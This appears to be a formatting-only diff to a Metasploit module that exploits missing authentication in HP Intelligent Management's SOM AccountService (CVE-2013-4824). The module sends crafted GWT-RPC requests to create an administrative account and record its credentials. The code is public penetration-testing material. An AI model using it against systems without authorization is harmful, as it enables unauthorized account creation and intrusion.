@@ -8,43 +8,45 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'HP Intelligent Management SOM Account Creation',
-      'Description'    => %q{
-        This module exploits a lack of authentication and access control in HP Intelligent
-        Management, specifically in the AccountService RpcServiceServlet from the SOM component,
-        in order to create a SOM account with Account Management permissions. This module has
-        been tested successfully on HP Intelligent Management Center 5.2 E0401 and 5.1 E202 with
-        SOM 5.2 E0401 and SOM 5.1 E0201 over Windows 2003 SP2.
-      },
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'HP Intelligent Management SOM Account Creation',
+        'Description' => %q{
+          This module exploits a lack of authentication and access control in HP Intelligent
+          Management, specifically in the AccountService RpcServiceServlet from the SOM component,
+          in order to create a SOM account with Account Management permissions. This module has
+          been tested successfully on HP Intelligent Management Center 5.2 E0401 and 5.1 E202 with
+          SOM 5.2 E0401 and SOM 5.1 E0201 over Windows 2003 SP2.
+        },
+        'References' => [
           [ 'CVE', '2013-4824' ],
           [ 'OSVDB', '98249' ],
           [ 'BID', '62902' ],
           [ 'ZDI', '13-240' ],
           [ 'URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03943547' ]
         ],
-      'Author'         =>
-        [
+        'Author' => [
           'rgod <rgod[at]autistici.org>', # Vulnerability Discovery
           'juan vazquez' # Metasploit module
         ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => '2013-10-08'
-    ))
+        'License' => MSF_LICENSE,
+        'DisclosureDate' => '2013-10-08'
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(8080),
         OptString.new('USERNAME', [true, 'Username for the new account', 'msf']),
         OptString.new('PASSWORD', [true, 'Password for the new account', 'p4ssw0rd'])
-      ])
+      ]
+    )
   end
 
   def get_service_desk_strong_name
     res = send_request_cgi({
-      'uri'    => normalize_uri("servicedesk", "servicedesk", "servicedesk.nocache.js"),
+      'uri' => normalize_uri("servicedesk", "servicedesk", "servicedesk.nocache.js"),
       'method' => 'GET'
     })
 
@@ -57,7 +59,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def get_account_service_strong_name(service_desk)
     res = send_request_cgi({
-      'uri'    => normalize_uri("servicedesk", "servicedesk", "#{service_desk}.cache.html"),
+      'uri' => normalize_uri("servicedesk", "servicedesk", "#{service_desk}.cache.html"),
       'method' => 'GET'
     })
 
@@ -69,7 +71,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-
     print_status("Trying to find the service desk service strong name...")
     service_desk = get_service_desk_strong_name
     if service_desk.nil?
@@ -86,7 +87,7 @@ class MetasploitModule < Msf::Auxiliary
     end
     print_good("AccountService strong number found: #{account_service}")
 
-    header= "6|0|39" # version | unknown | string_table size
+    header = "6|0|39" # version | unknown | string_table size
 
     # Used to parse the payload
     string_table = [
@@ -191,9 +192,9 @@ class MetasploitModule < Msf::Auxiliary
       "10", # address Type (String)
       "35", # address Value ("")
       "36", # RpcMap[12] => phone
-      "-19",# phone Type - not provided
+      "-19", # phone Type - not provided
       "37", # RpcMap[13] => email
-      "-19",# email Type - not provided
+      "-19", # email Type - not provided
       "38", # RpcMap[14] => userAppendInfo
       "39", # userAppendInfo Type (HashMap)
       "0"   # userAppendInfo HashMap size (0)
@@ -208,13 +209,13 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Trying to create account #{datastore["USERNAME"]}...")
     res = send_request_cgi({
       'method' => 'POST',
-      'uri'    => normalize_uri("servicedesk", "servicedesk", "accountSerivce.gwtsvc"),
-      'ctype'  => 'text/x-gwt-rpc; charset=UTF-8',
+      'uri' => normalize_uri("servicedesk", "servicedesk", "accountSerivce.gwtsvc"),
+      'ctype' => 'text/x-gwt-rpc; charset=UTF-8',
       'headers' => {
         "X-GWT-Module-Base" => service_url,
         "X-GWT-Permutation" => "#{service_desk}"
       },
-      'data'   => gwt_request
+      'data' => gwt_request
     })
 
     unless res and res.code == 200
@@ -230,13 +231,13 @@ class MetasploitModule < Msf::Auxiliary
       login_url << "#{rhost}:#{rport}/servicedesk/ServiceDesk.jsp"
 
       connection_details = {
-          module_fullname: self.fullname,
-          username: datastore['USERNAME'],
-          private_data: datastore['PASSWORD'],
-          private_type: :password,
-          workspace_id: myworkspace_id,
-          proof: "#{login_url}\n#{res.body}",
-          status: Metasploit::Model::Login::Status::UNTRIED
+        module_fullname: self.fullname,
+        username: datastore['USERNAME'],
+        private_data: datastore['PASSWORD'],
+        private_type: :password,
+        workspace_id: myworkspace_id,
+        proof: "#{login_url}\n#{res.body}",
+        status: Metasploit::Model::Login::Status::UNTRIED
       }.merge(service_details)
       create_credential_and_login(connection_details)
 
